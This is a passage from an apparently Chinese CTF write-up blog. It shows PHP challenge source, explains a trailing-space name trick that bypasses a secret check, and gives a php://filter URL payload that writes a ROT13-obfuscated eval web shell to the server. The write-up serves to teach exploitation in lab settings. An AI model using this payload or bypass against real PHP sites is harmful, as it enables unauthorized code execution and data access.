class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">  <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(</span><br><span class="line">    <span class="string">&quot;SELECT name, description FROM products WHERE name = ?&quot;</span></span><br><span class="line">  );</span><br><span class="line">  <span class="title function_ invoke__">check_errors</span>(<span class="variable">$statement</span>);</span><br><span class="line">  <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line">  <span class="title function_ invoke__">check_errors</span>(<span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">execute</span>());</span><br><span class="line">  <span class="variable">$res</span> = <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">get_result</span>();</span><br><span class="line">  <span class="title function_ invoke__">check_errors</span>(<span class="variable">$res</span>);</span><br><span class="line">  <span class="variable">$product</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">  <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$product</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_product</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$secret</span>, <span class="variable">$description</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">  <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(</span><br><span class="line">    <span class="string">&quot;INSERT INTO products (name, secret, description) VALUES</span></span><br><span class="line"><span class="string">      (?, ?, ?)&quot;</span></span><br><span class="line">  );</span><br><span class="line">  <span class="title function_ invoke__">check_errors</span>(<span class="variable">$statement</span>);</span><br><span class="line">  <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;sss&quot;</span>, <span class="variable">$name</span>, <span class="variable">$secret</span>, <span class="variable">$description</span>);</span><br><span class="line">  <span class="title function_ invoke__">check_errors</span>(<span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">execute</span>());</span><br><span class="line">  <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_name_secret</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">  <span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable">$statement</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(</span><br><span class="line">    <span class="string">&quot;SELECT name FROM products WHERE name = ? AND secret = ?&quot;</span></span><br><span class="line">  );</span><br><span class="line">  <span class="title function_ invoke__">check_errors</span>(<span class="variable">$statement</span>);</span><br><span class="line">  <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$name</span>, <span class="variable">$secret</span>);</span><br><span class="line">  <span class="title function_ invoke__">check_errors</span>(<span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">execute</span>());</span><br><span class="line">  <span class="variable">$res</span> = <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">get_result</span>();</span><br><span class="line">  <span class="title function_ invoke__">check_errors</span>(<span class="variable">$res</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>() !== <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$statement</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$valid</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>add.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;db.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;header.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate_secret</span>(<span class="params"><span class="variable">$secret</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$secret</span>) &lt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$has_lowercase</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable">$has_uppercase</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable">$has_number</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="title function_ invoke__">str_split</span>(<span class="variable">$secret</span>) <span class="keyword">as</span> <span class="variable">$ch</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_lower</span>(<span class="variable">$ch</span>)) &#123;</span><br><span class="line">      <span class="variable">$has_lowercase</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_upper</span>(<span class="variable">$ch</span>)) &#123;</span><br><span class="line">      <span class="variable">$has_uppercase</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$ch</span>)) &#123;</span><br><span class="line">      <span class="variable">$has_number</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$has_lowercase</span> &amp;&amp; <span class="variable">$has_uppercase</span> &amp;&amp; <span class="variable">$has_number</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle_post</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$_POST</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">  <span class="variable">$secret</span> = <span class="variable">$_POST</span>[<span class="string">&quot;secret&quot;</span>];</span><br><span class="line">  <span class="variable">$description</span> = <span class="variable">$_POST</span>[<span class="string">&quot;description&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$name</span>) &amp;&amp; <span class="variable">$name</span> !== <span class="string">&quot;&quot;</span></span><br><span class="line">        &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$secret</span>) &amp;&amp; <span class="variable">$secret</span> !== <span class="string">&quot;&quot;</span></span><br><span class="line">        &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$description</span>) &amp;&amp; <span class="variable">$description</span> !== <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">validate_secret</span>(<span class="variable">$secret</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Invalid secret, please check requirements&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$product</span> = <span class="title function_ invoke__">get_product</span>(<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$product</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Product name already exists, please enter again&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">insert_product</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$secret</span>), <span class="variable">$description</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Product has been added&lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$error</span> = <span class="title function_ invoke__">handle_post</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$error</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Error: &quot;</span> . <span class="variable">$error</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;/add.php&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">  Name of your product: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">Secret</span> (<span class="number">10</span>+ characters, smallcase, uppercase, number) : &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;secret&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">  Description: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;description&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Add&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span>(<span class="string">&quot;footer.php&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>view.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;db.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;header.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle_post</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">global</span> <span class="variable">$_POST</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">  <span class="variable">$secret</span> = <span class="variable">$_POST</span>[<span class="string">&quot;secret&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$name</span>) &amp;&amp; <span class="variable">$name</span> !== <span class="string">&quot;&quot;</span></span><br><span class="line">        &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$secret</span>) &amp;&amp; <span class="variable">$secret</span> !== <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_name_secret</span>(<span class="variable">$name</span>, <span class="title function_ invoke__">hash</span>(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$secret</span>)) === <span class="literal">false</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;Incorrect name or secret, please try again&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$product</span> = <span class="title function_ invoke__">get_product</span>(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Product details:&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;ul&gt;&lt;li&gt;&quot;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$product</span>[<span class="string">&#x27;name&#x27;</span>]) . <span class="string">&quot;&lt;/li&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;li&gt;&quot;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$product</span>[<span class="string">&#x27;description&#x27;</span>]) . <span class="string">&quot;&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$error</span> = <span class="title function_ invoke__">handle_post</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$error</span> !== <span class="literal">null</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Error: &quot;</span> . <span class="variable">$error</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;/view.php&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">  Name: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">  Secret: &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;secret&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;View&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require_once</span>(<span class="string">&quot;footer.php&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>view.php这里存在比较严重的逻辑漏洞，<code>check_name_secret($name, hash(&#39;sha256&#39;, $secret)</code>检查之后他查询的还是<code>$name</code>的信息，也就是假如我有2个重名的用户，你最终返回的会是其中的一个，然后我们要查询的是<code>facebook</code>的detail，在db.php说了flag在里面，那么我们现在需要做的就是注册一个和facebook名字”相同”的账号，也就是满足<code>facebook=xxxx</code>比较的，这样我们就可以绕过secret了，解决方法也是简单<br>直接注册一个<code>facebook </code>，注意后面有空格，这样就可以绕过了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685964678872-3eb14222-fbeb-4e3b-8fc2-ff30c8a81bb3.png#averageHue=%23efefee&clientId=u9df98744-ef23-4&from=paste&height=365&id=uf19d70c6&originHeight=456&originWidth=931&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23172&status=done&style=none&taskId=u5a740e1a-49ee-44e9-b6fb-3bc7a47d4ce&title=&width=744.8" alt="image.png"></p>
<h1 id="WMCTF2020-Web-Check-in-2-0"><a href="#WMCTF2020-Web-Check-in-2-0" class="headerlink" title="[WMCTF2020]Web Check in 2.0"></a>[WMCTF2020]Web Check in 2.0</h1><p>考点：双重编码绕死亡函数，反弹shell<br><code>[http://a691c5ec-6451-45df-8e38-fb434973e5ff.node4.buuoj.cn:81/?content=php://filter/write=string.%25%37%32%25%36%66%25%37%3413|%3C%3Fcuc%20riny(%24_CBFG%5B1%5D)%3B%3F%3E|/resource=s1mple.php](http://a691c5ec-6451-45df-8e38-fb434973e5ff.node4.buuoj.cn:81/?content=php://filter/write=string.%25%37%32%25%36%66%25%37%3413|%3C%3Fcuc%20riny(%24_CBFG%5B1%5D)%3B%3F%3E|/resource=s1mple.php)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687443413735-1d4f88e5-8d34-43dc-8a6d-db6262240226.png#averageHue=%23b3b3b3&clientId=u99525074-217f-4&from=paste&height=766&id=u0d6f2ca7&originHeight=957&originWidth=1602&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106100&status=done&style=none&taskId=uef245c16-019a-46f8-a630-6c26b5f7813&title=&width=1281.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1687443418944-2f28a4c4-c494-4764-8e84-7a50ce95d145.png#averageHue=%23272625&clientId=u99525074-217f-4&from=paste&height=209&id=u3fc10e6b&originHeight=261&originWidth=579&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11926&status=done&style=none&taskId=ubbdf9dc2-2d79-4de5-90af-e1b5bf87029&title=&width=463.2" alt="image.png"></p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/BUUCTF/" class="tag">#BUUCTF</a><a href="/tags/刷题记录/" class="tag">#刷题记录</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/07/08/BUUCTF%20Web%20WriteUp%208/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">BUUCTF Web Writeup 8</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/07/02/BUUCTF%20Web%20WriteUp%207/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">BUUCTF Web Writeup 7</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>